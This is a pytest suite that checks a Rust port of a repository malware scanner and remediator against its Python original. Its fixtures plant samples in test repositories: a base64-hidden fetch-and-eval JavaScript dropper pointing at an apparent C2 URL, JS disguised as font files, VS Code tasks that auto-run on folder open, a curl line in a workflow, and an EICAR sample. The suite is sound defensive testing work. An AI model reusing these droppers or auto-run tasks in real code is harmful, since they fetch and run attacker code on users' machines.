"""`guard scan`, `scan-git`, `open`, `clean` and `restore` in the Rust binary
against scanner.py and remediator.py (Python), side by side.

Each test builds the same tree twice (one copy per build where the command
changes files), runs `guard.py ...` and the Rust binary, and requires the same
output, exit code and files. Backup timestamps and the per-build folders are the
only things normalised.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

import samples
from conftest import build_pe, write
from rustbin import ROOT, WINDOWS, run_python, run_rust, rust_guard  # noqa: F401  (fixture)

HAVE_GIT = shutil.which("git") is not None
needs_git = pytest.mark.skipif(not HAVE_GIT, reason="git not installed")

PAYLOAD = (
    "(async () => {\n"
    "  const src = atob(process.env.AUTH_API_KEY);\n"
    "  const proxyInfo = await (await fetch(src)).text();\n"
    "  eval(proxyInfo);\n"
    "})();\n"
)
B64_C2 = "aHR0cHM6Ly9hdXRoLWNvbmZpcm0tdGVuLnZlcmNlbC5hcHAvYXBp"


def text(b: bytes) -> str:
    return b.decode("utf-8", "replace").replace("\r\n", "\n")


def both(tmp_path, rust_guard, *args, env=None, cwd=None, py_cwd=None, rs_cwd=None):
    env = {"GUARD_HOME": str(tmp_path / "home"), "PYTHONIOENCODING": "utf-8", **(env or {})}
    return (run_python(*args, env=env, cwd=py_cwd or cwd),
            run_rust(rust_guard, *args, env=env, cwd=rs_cwd or cwd))


def same(py, rs, stderr=True):
    assert rs.returncode == py.returncode, (text(py.stderr), text(rs.stderr))
    assert text(rs.stdout) == text(py.stdout)
    if stderr:
        assert text(rs.stderr) == text(py.stderr)


def tree(root: Path) -> dict[str, bytes]:
    return {p.relative_to(root).as_posix(): p.read_bytes() for p in sorted(root.rglob("*")) if p.is_file()}


# ---------------------------------------------------------------------------
# corpus
# ---------------------------------------------------------------------------
def droppers(d: Path) -> None:
    """Fake fonts / images: disguised source, suspicious source, bad headers, real ones."""
    js = b"const x = require('child_process'); global['!']='9'; module.exports = () => 1;\n"
    write(d / "public" / "fonts" / "fa-solid-400.woff2", js)
    write(d / "public" / "fonts" / "real.woff2", b"wOF2" + bytes(64))
    write(d / "public" / "fonts" / "real.ttf", b"true" + bytes(64))
    write(d / "public" / "fonts" / "font.eot", b"function f() { import x }\n")
    write(d / "public" / "fonts" / "font2.eot", bytes(range(256)))
    write(d / "img" / "logo.PNG", b"GIF89a" + bytes(32))
    write(d / "img" / "fake.jpg", "/* \u00e9 */ var _$_1e42 = eval(process.env.X);\n".encode())
    write(d / "img" / "short.gif", b"GI")
    write(d / "img" / "empty.ico", b"")
    # the 4 KB sniff window ends inside a multi-byte character: not text
    write(d / "img" / "cut.png", b"require(" + b"a" * 4087 + "\u00e9".encode())


def vscode(d: Path, settings: str | bytes | None, tasks: str | bytes | None) -> Path:
    if settings is not None:
        write(d / ".vscode" / "settings.json", settings)
    if tasks is not None:
        write(d / ".vscode" / "tasks.json", tasks)
    return d


TASKS = """{
  // JSONC: comments and trailing commas
  "version": "2.0.0",
  "tasks": [
    {"label": "dev", "command": "npm", "args": ["run", "dev"],},
    {"label": "boot", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-400.woff2"],
     "runOptions": {"runOn": "folderOpen"}},
    {"label": "top-level", "command": ["sh", "-c"], "args": "curl", "runOn": "folderOpen"},
    {"label": "quiet", "command": "make", "runOptions": {"runOn": "folderOpen"}},
    {"label": "fetch", "command": "true", "args": ["wget http://x/a.woff"]},
    "not a task",
    {"label": "num", "command": 3.0, "args": [1, null, true]},
  ],
}
"""


def manifests(d: Path) -> None:
    write(d / "package.json", json.dumps({"dependencies": {"@art-ws/common": "^2.0.27", "left-pad": "1.0.0"},
                                         "devDependencies": {"@art-ws/common": "2.0.22", "--no-audit": "*"}}))
    write(d / "web" / "package-lock.json", json.dumps({
        "packages": {"": {}, "node_modules/@art-ws/db-context": {"version": "2.0.21"},
                     "node_modules/a/node_modules/--hiljson": {}},
        "dependencies": {"x": {"version": "1", "dependencies": {"@art-ws/common": {"version": "2.0.28"}}}}}))
    write(d / "py" / "requirements-dev.txt", "# pinned\n-r base.txt\nnum2words==0.5.16 ; python_version>'3'\nnum2words\nrequests==2.0\n")
    write(d / "py" / "requirements.txt", "num2words == 0.5.15\r\n0requests==0.0.1\n")
    write(d / "py" / "Pipfile.lock", json.dumps({"default": {"num2words": {"version": "==0.5.16"}}, "develop": None}))
    write(d / "bad" / "package.json", "{not json")


def corpus(root: Path) -> Path:
    d = root / "repo"
    droppers(d)
    vscode(d, '{\n  // auto tasks\n  "task.allowAutomaticTasks": true,\n  "editor.tabSize": 2,\n}\n', TASKS)
    manifests(d)
    write(d / ".env", f"PORT=3000\nAUTH_API_KEY={B64_C2}\n")
    write(d / "src" / "server.ts", "import express from 'express';\n\n" + PAYLOAD + "\nexport const app = express();\n")
    write(d / "src" / "crlf.js", ("const a = 1;\n" + PAYLOAD + "module.exports = a;\n").replace("\n", "\r\n"))
    write(d / "src" / "ioc.md", "see https://auth-confirm-ten.vercel.app/api and 45.139.104.115\n")
    write(d / "src" / "obf.mjs", "var _$_1e42=['x'];sfL[\"constructor\"]('return this')();\n")
    write(d / "src" / "unicode-\u00e9\u00e8.js", "// caf\u00e9 \ufffd\neval(proxyInfo)\n")
    write(d / "src" / "binary.dat", bytes(range(256)) * 4 + b"eval(proxyInfo)")
    write(d / "eicar.com", samples.eicar())
    write(d / "bin" / "svchost.exe", build_pe(extra=b"VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0"))
    write(d / ".github" / "workflows" / "deploy.yml", "on: push\njobs: {}\n")
    write(d / ".github" / "workflows" / "ci.yml", "run: node ./public/fonts/x.js && eval(proxyInfo)\n")
    write(d / ".github" / "workflows" / "nested" / "release.YAML", "on: tag\n")
    write(d / ".github" / "workflows" / "notes.txt", "not a workflow\n")
    # pruned directories, and a file merely named like one
    write(d / "node_modules" / "evil" / "index.js", PAYLOAD)
    write(d / "deep" / "target" / "x.js", PAYLOAD)
    write(d / "deep" / "dist", "eval(proxyInfo)\n")
    write(d / "deep" / "Vendor" / "x.js", "eval(proxyInfo)\n")
    if not WINDOWS:
        os.symlink(d / "src", d / "linked-src")
        os.symlink(d / "src" / "server.ts", d / "server-link.ts")
        os.symlink(d / "missing.woff", d / "broken.woff")
    return d


# ---------------------------------------------------------------------------
# scan / scan-git / open
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("flags", [[], ["--json"]])
@pytest.mark.parametrize("repo", ["fake-infected-repo", "clean-repo", "wf-repo"])
def test_testdata_repos(tmp_path, rust_guard, repo, flags):
    for cmd in ("scan", "open"):
        same(*both(tmp_path, rust_guard, cmd, str(ROOT / "testdata" / repo), *flags))


@pytest.mark.parametrize("flags", [[], ["--json"]])
def test_scan_corpus(tmp_path, rust_guard, flags):
    d = corpus(tmp_path)
    py, rs = both(tmp_path, rust_guard, "scan", str(d), *flags)
    same(py, rs)
    assert py.returncode == 1
    if flags:
        tree_ = json.loads(py.stdout)["tree"]
        assert {b: len(tree_[b]) > 0 for b in ("vscode", "magic", "fingerprint", "workflow_baseline",
                                               "malicious_deps", "av")} == dict.fromkeys(
            ("vscode", "magic", "fingerprint", "workflow_baseline", "malicious_deps", "av"), True)


def test_scan_relative_and_default_path(tmp_path, rust_guard):
    d = corpus(tmp_path)
    for args in (["scan"], ["scan", "."], ["scan", "./"], ["scan", "--json"], ["open"], ["scan", "src/../src"]):
        same(*both(tmp_path, rust_guard, *args, cwd=d))


def test_scan_missing_and_file_targets(tmp_path, rust_guard):
    d = corpus(tmp_path)
    for target in (tmp_path / "nope", d / "src" / "server.ts", d / "eicar.com"):
        for cmd in ("scan", "open"):
            same(*both(tmp_path, rust_guard, cmd, str(target), "--json"))


def test_workflow_baselines(tmp_path, rust_guard):
    """No baseline, then a recorded one with changed, added and removed workflows."""
    d = tmp_path / "wf"
    write(d / ".github" / "workflows" / "build.yml", "on: push\n")
    write(d / ".github" / "workflows" / "deploy.yml", "on: push\n")
    write(d / ".github" / "workflows" / "gone.yml", "on: push\n")
    same(*both(tmp_path, rust_guard, "scan", str(d)))
    env = {**os.environ, "GUARD_HOME": str(tmp_path / "home"), "PYTHONPATH": str(ROOT)}
    subprocess.run([sys.executable, "-c",
                    "import sys; from workflow_baseline import WorkflowBaseline; WorkflowBaseline().record(sys.argv[1])",
                    str(d)], check=True, env=env, cwd=ROOT)
    same(*both(tmp_path, rust_guard, "scan", str(d), "--json"))
    write(d / ".github" / "workflows" / "deploy.yml", "on: push\nrun: eval(proxyInfo)\n")
    write(d / ".github" / "workflows" / "build.yml", "on: [push]\n")
    write(d / ".github" / "workflows" / "new.yaml", "on: push\n")
    (d / ".github" / "workflows" / "gone.yml").unlink()
    for flags in ([], ["--json"]):
        py, rs = both(tmp_path, rust_guard, "scan", str(d), *flags)
        same(py, rs)
    assert py.returncode == 1


def test_manifest_that_is_not_an_object(tmp_path, rust_guard):
    """Python's scan crashes on a lockfile holding a JSON list; the binary skips
    the file and reports the rest of the tree as Python reports it without it."""
    d = tmp_path / "deps"
    manifests(d)
    py = run_python("scan", str(d), "--json", env={"GUARD_HOME": str(tmp_path / "home")})
    write(d / "bad" / "Pipfile.lock", "[1, 2]")
    rs = run_rust(rust_guard, "scan", str(d), "--json", env={"GUARD_HOME": str(tmp_path / "home")})
    same(py, rs)
    assert run_python("scan", str(d), env={"GUARD_HOME": str(tmp_path / "home")}).returncode == 1


def test_dependency_blocklist_override(tmp_path, rust_guard):
    d = tmp_path / "deps"
    manifests(d)
    bl = write(tmp_path / "bl.json", json.dumps({"npm": {"left-pad": ["< 1.1"]}, "pip": {"requests": ["= 2.0"]}}))
    for env in ({"GUARD_DEP_BLOCKLIST": str(bl)}, {"GUARD_DEP_BLOCKLIST": str(tmp_path / "missing.json")},
                {"GUARD_DEP_BLOCKLIST": str(write(tmp_path / "broken.json", "{"))}):
        same(*both(tmp_path, rust_guard, "scan", str(d), "--json", env=env))


@pytest.mark.parametrize("settings,tasks", [
    ('{"task.allowAutomaticTasks": true}', None),
    ('{"task.allowAutomaticTasks": "true"}', None),
    ('{"task.allowAutomaticTasks": true, oops}', None),
    ('["task.allowAutomaticTasks"]', None),
    (b'\xef\xbb\xbf{"task.allowAutomaticTasks": true}', None),
    (None, TASKS),
    (None, '{"tasks": [{"command": "node x", "runOn": "folderOpen"}], oops'),
    (None, '{"tasks": "abc"}'),
    (None, '{"tasks": [{"command": "x", "runOptions": {"runOn": ""}, "runOn": "FolderOpen"}]}'),
    (None, "[1]"),
    ("", ""),
])
def test_open_vscode_variants(tmp_path, rust_guard, settings, tasks):
    d = vscode(tmp_path / "r", settings, tasks)
    for flags in ([], ["--json"]):
        same(*both(tmp_path, rust_guard, "open", str(d), *flags))
    same(*both(tmp_path, rust_guard, "scan", str(d), "--json"))


def test_custom_signatures(tmp_path, rust_guard):
    sig = json.loads((ROOT / "signatures.json").read_text(encoding="utf-8"))
    sig["regexes"].append({"id": "t.re", "severity": "critical", "category": "t", "flags": "IGNORECASE|MULTILINE",
                           "pattern": r"^\s*BAD\s+marker\Z", "desc": "custom"})
    sig["literals"].append({"id": "t.lit", "severity": "high", "value": "needle", "desc": "lit",
                            "applies_to": ["./notes/x.txt", ".cfg"]})
    sig["combo_rules"].append({"id": "t.combo", "severity": "high", "all_of": ["alpha", "beta"], "desc": "combo"})
    sig["vscode_guard"]["tasks_danger_commands"] = ["Deno"]
    sig["magic_bytes"]["by_ext"] = {".DAT": ["CAFE"], ".dat": ["beef"]}
    sig["known_dropper_filenames"] = ["evil.dat"]
    sig["skip_path_prefixes"] = ["skipme/"]
    s = write(tmp_path / "sig.json", json.dumps(sig))
    d = tmp_path / "r"
    write(d / "notes" / "x.txt", "a needle here\n  bad MARKER")
    write(d / "a.cfg", "needle alpha beta")
    write(d / "evil.dat", b"\xbe\xefxx")
    write(d / "plain.dat", "require('x')")
    write(d / "skipme" / "y.txt", "alpha beta")
    write(d / "z" / "skipme", "alpha beta")
    vscode(d, None, '{"tasks": [{"command": "deno run x", "runOn": "folderOpen"}]}')
    for args in (["scan", str(d), "--signatures", str(s)], ["open", str(d), f"--sig={s}", "--json"]):
        same(*both(tmp_path, rust_guard, *args))


def test_bad_signatures(tmp_path, rust_guard):
    """Python prints a traceback, the binary one line; both exit 1."""
    for path in (tmp_path / "missing.json", write(tmp_path / "bad.json", "{")):
        py, rs = both(tmp_path, rust_guard, "scan", ".", "--signatures", str(path))
        assert (py.returncode, rs.returncode) == (1, 1)
        assert rs.stdout == b"" and text(rs.stderr).startswith("guard: ")


def _new_argparse() -> bool:
    """Python 3.12.7+ fills an optional positional that follows an option
    (`scan --json x` scans x); older versions call x unrecognized. The release
    is built with 3.12, so the binary does what 3.12 does."""
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("a", nargs="?")
    ap.add_argument("b", nargs="?")
    ap.add_argument("--f", action="store_true")
    import contextlib
    import io
    try:
        with contextlib.redirect_stderr(io.StringIO()):
            return ap.parse_args(["1", "--f", "2"]).b == "2"
    except SystemExit:
        return False


NEW_ARGPARSE = _new_argparse()
INTERLEAVED = [["scan", "--json", "x"], ["scan", "--nope", "x", "y"]]


@pytest.mark.parametrize("args", [
    ["scan", "-h"], ["open", "--help"], ["scan-git", "--he"], ["scan", "a", "b"], ["scan", "--json", "x"],
    ["scan", "--nope", "x", "y"], ["scan", "--json=1"], ["scan", "--signatures"], ["scan", ".", "--sig"],
    ["scan", "--", "--json"], ["scan", "-x"], ["scan", "-1"], ["open", ".", "--j", "--s", "-h"],
    ["scan", "--signatures", "--json"],
])
def test_usage(tmp_path, rust_guard, args):
    if args in INTERLEAVED and not NEW_ARGPARSE:
        pytest.skip("this Python's argparse predates the 3.12 behaviour the binary follows")
    same(*both(tmp_path, rust_guard, *args, cwd=tmp_path))


def git(repo: Path, *args: str) -> None:
    env = {**os.environ, "GIT_AUTHOR_NAME": "A", "GIT_AUTHOR_EMAIL": "a@x", "GIT_COMMITTER_NAME": "A",
           "GIT_COMMITTER_EMAIL": "a@x", "GIT_AUTHOR_DATE": "2026-01-01T00:00:00Z",
           "GIT_COMMITTER_DATE": "2026-01-01T00:00:00Z"}
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True, env=env)


@needs_git
def test_scan_git(tmp_path, rust_guard):
    r = tmp_path / "g"
    r.mkdir()
    git(r, "init", "-q", "-b", "main")
    git(r, "config", "core.autocrlf", "false")
    write(r / "a.js", "console.log(1)\n")
    git(r, "add", "-A")
    git(r, "commit", "-qm", "one")
    write(r / "a.js", "console.log(1)\n" + PAYLOAD)
    write(r / ".github" / "workflows" / "x.yml", "on: push\nrun: curl auth-confirm-ten.vercel.app\r\n")
    git(r, "add", "-A")
    git(r, "commit", "-qm", "two")
    write(r / "a.js", "console.log(1)\n")
    (r / ".github" / "workflows" / "x.yml").unlink()
    git(r, "add", "-A")
    git(r, "commit", "-qm", "clean again")
    git(r, "checkout", "-qb", "side")
    write(r / "b.txt", "45.139.104.115\u2028line\n")
    git(r, "add", "-A")
    git(r, "commit", "-qm", "side")
    for flags in ([], ["--json"]):
        py, rs = both(tmp_path, rust_guard, "scan-git", str(r), *flags)
        same(py, rs)
    assert py.returncode == 1


@needs_git
def test_scan_git_errors(tmp_path, rust_guard):
    plain = tmp_path / "plain"
    write(plain / "x.txt", "hi\n")
    for flags in ([], ["--json"]):
        same(*both(tmp_path, rust_guard, "scan-git", str(plain), *flags))


@pytest.mark.skipif(WINDOWS, reason="PATH lookup of git differs on Windows")
def test_scan_git_without_git(tmp_path, rust_guard):
    plain = tmp_path / "plain"
    write(plain / "x.txt", "hi\n")
    empty = tmp_path / "nobin"
    empty.mkdir()
    same(*both(tmp_path, rust_guard, "scan-git", str(plain), "--json", env={"PATH": str(empty)}))


# ---------------------------------------------------------------------------
# clean / restore
# ---------------------------------------------------------------------------
TS = re.compile(r"\d{8}T\d{6}Z")


def safe(p: Path) -> str:
    return re.sub(r"[^A-Za-z0-9._-]", "_", str(p)).strip("_")


def norm(s: str, tmp_path: Path) -> str:
    s = TS.sub("TS", s)
    for who in ("py", "rs"):
        s = s.replace(safe(tmp_path / who), "<safe-X>")
        for p in (tmp_path / who, tmp_path / f"home-{who}"):
            s = s.replace(json.dumps(str(p))[1:-1], "<" + p.name.replace(who, "X") + ">").replace(str(p), "<" + p.name.replace(who, "X") + ">")
    return s


def index(home: Path, tmp_path: Path) -> list[dict]:
    f = home / "quarantine" / "index.jsonl"
    if not f.exists():
        return []
    recs = [json.loads(norm(line, tmp_path)) for line in f.read_text(encoding="utf-8").splitlines() if line.strip()]
    for r in recs:
        if "ts" in r:
            assert re.fullmatch(r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d{6})?\+00:00", r.pop("ts"))
    return recs


def backups(home: Path, tmp_path: Path) -> dict[str, bytes]:
    q = home / "quarantine"
    return {norm(p.name, tmp_path): p.read_bytes() for p in sorted(q.glob("*.bak"))} if q.exists() else {}


def run_each(tmp_path, rust_guard, *args, cwd_name=None):
    """Run in tmp/py with home-py, and tmp/rs with home-rs."""
    out = {}
    for who in ("py", "rs"):
        env = {"GUARD_HOME": str(tmp_path / f"home-{who}"), "PYTHONIOENCODING": "utf-8"}
        a = [str(x).replace("{w}", str(tmp_path / who)) for x in args]
        cwd = tmp_path / who / cwd_name if cwd_name is not None else None
        out[who] = run_python(*a, env=env, cwd=cwd) if who == "py" else run_rust(rust_guard, *a, env=env, cwd=cwd)
    return out["py"], out["rs"]


def same_each(tmp_path, py, rs):
    assert rs.returncode == py.returncode, (text(py.stderr), text(rs.stderr))
    assert norm(text(rs.stdout), tmp_path) == norm(text(py.stdout), tmp_path)
    assert norm(text(rs.stderr), tmp_path) == norm(text(py.stderr), tmp_path)
    assert tree(tmp_path / "rs") == tree(tmp_path / "py")
    assert index(tmp_path / "home-rs", tmp_path) == index(tmp_path / "home-py", tmp_path)
    assert backups(tmp_path / "home-rs", tmp_path) == backups(tmp_path / "home-py", tmp_path)


def two_copies(tmp_path, build) -> None:
    for who in ("py", "rs"):
        build(tmp_path / who)


def infected_repo(d: Path) -> None:
    corpus_root = d.parent / f".src-{d.name}"
    if not corpus_root.exists():
        corpus(corpus_root)
    shutil.copytree(corpus_root / "repo", d, symlinks=True)


def test_clean_repo(tmp_path, rust_guard):
    two_copies(tmp_path, infected_repo)
    py, rs = run_each(tmp_path, rust_guard, "clean", "{w}")
    same_each(tmp_path, py, rs)
    summary = json.loads(py.stdout[py.stdout.index(b"{"):])
    assert summary["neutralized"] and summary["quarantined"] and summary["config_cleaned"]
    # a second run finds nothing left to fix
    same_each(tmp_path, *run_each(tmp_path, rust_guard, "clean", "{w}"))


def test_clean_relative_and_restore_cross(tmp_path, rust_guard):
    """Each build restores from the backups the other one made."""
    two_copies(tmp_path, infected_repo)
    same_each(tmp_path, *run_each(tmp_path, rust_guard, "clean", cwd_name=""))
    # swap the indexes only: their backup paths are absolute and must still point
    # at the files each build wrote (swapping the homes matched only when both
    # cleans ran in the same second, as backup names carry the time)
    idx = {who: tmp_path / f"home-{who}" / "quarantine" / "index.jsonl" for who in ("py", "rs")}
    data = {who: f.read_bytes() for who, f in idx.items()}
    idx["py"].write_bytes(data["rs"])
    idx["rs"].write_bytes(data["py"])
    # on POSIX the payload is cut through server-link.ts, a link to src/server.ts
    for target in ("src/server.ts", "server-link.ts", "public/fonts/fa-solid-400.woff2", ".vscode/tasks.json", "nope"):
        py, rs = run_each(tmp_path, rust_guard, "restore", str(Path(target)), cwd_name="")
        assert rs.returncode == py.returncode == 0
        assert norm(text(rs.stdout), tmp_path) == norm(text(py.stdout), tmp_path)
        assert tree(tmp_path / "rs") == tree(tmp_path / "py")
    assert (tmp_path / "py" / "src" / "server.ts").read_bytes() == (tmp_path / ".src-py" / "repo" / "src" / "server.ts").read_bytes()


def test_restore_by_backup_name(tmp_path, rust_guard):
    two_copies(tmp_path, infected_repo)
    run_each(tmp_path, rust_guard, "clean", "{w}")
    names = {}
    for who in ("py", "rs"):
        names[who] = next(p.name for p in (tmp_path / f"home-{who}" / "quarantine").glob("*server.ts*.bak"))
    out = {}
    for who in ("py", "rs"):
        env = {"GUARD_HOME": str(tmp_path / f"home-{who}")}
        out[who] = (run_python if who == "py" else lambda *a, **k: run_rust(rust_guard, *a, **k))("restore", names[who], env=env)
    same_each(tmp_path, out["py"], out["rs"])


def test_clean_single_files(tmp_path, rust_guard):
    def build(d: Path):
        write(d / "app.js", "const a = 1;\n" + PAYLOAD + "export default a;\n")
        write(d / "crlf.ts", ("let b = 2;\n\n\n" + PAYLOAD + "\n\n\nexport { b };\n").replace("\n", "\r\n"))
        write(d / "unbalanced.js", "function f() {\n  " + PAYLOAD + "\n")
        write(d / "lib.py", "eval(proxyInfo)\n")
        write(d / ".vscode" / "settings.json", '{"a": 1, "task.allowAutomaticTasks": true, "z": [1.0, 1e5, "\u00e9"]}')
        write(d / ".vscode" / "launch.json", '{"configurations": [], "tasks": [{"runOptions": {"runOn": "folderOpen"}, "command": "node ./x"}]}')
        write(d / ".vscode" / "tasks.json", '{"tasks": [{"label": "safe"}]}')
    two_copies(tmp_path, build)
    for f in ("app.js", "crlf.ts", "unbalanced.js", "lib.py", ".vscode/settings.json", ".vscode/launch.json",
              ".vscode/tasks.json", "missing.js"):
        same_each(tmp_path, *run_each(tmp_path, rust_guard, "clean", "{w}/" + f))


def test_restore_errors(tmp_path, rust_guard):
    two_copies(tmp_path, lambda d: d.mkdir())
    same_each(tmp_path, *run_each(tmp_path, rust_guard, "restore", "x"))
    same_each(tmp_path, *run_each(tmp_path, rust_guard, "restore"))
    for who in ("py", "rs"):
        q = tmp_path / f"home-{who}" / "quarantine"
        q.mkdir(parents=True, exist_ok=True)
        (q / "index.jsonl").write_text(json.dumps({"action": "quarantine", "path": "/x/y", "backup": str(q / "gone.bak")}) + "\n\n")
    same_each(tmp_path, *run_each(tmp_path, rust_guard, "restore", "/x/y"))
    same_each(tmp_path, *run_each(tmp_path, rust_guard, "restore", "gone.bak"))


@pytest.mark.skipif(WINDOWS or os.geteuid() == 0, reason="needs a POSIX non-root user to make a file unreadable")
def test_unreadable_files(tmp_path, rust_guard):
    d = tmp_path / "r"
    for name in ("font.woff2", "app.js", "package.json"):
        write(d / name, "eval(proxyInfo)\n").chmod(0)
    vscode(d, '{"task.allowAutomaticTasks": true}', None).joinpath(".vscode", "settings.json").chmod(0)
    write(d / "locked" / "x.js", "eval(proxyInfo)\n")
    (d / "locked").chmod(0)
    try:
        for args in (["scan", str(d)], ["scan", str(d), "--json"], ["open", str(d)]):
            same(*both(tmp_path, rust_guard, *args))
    finally:
        (d / "locked").chmod(0o755)
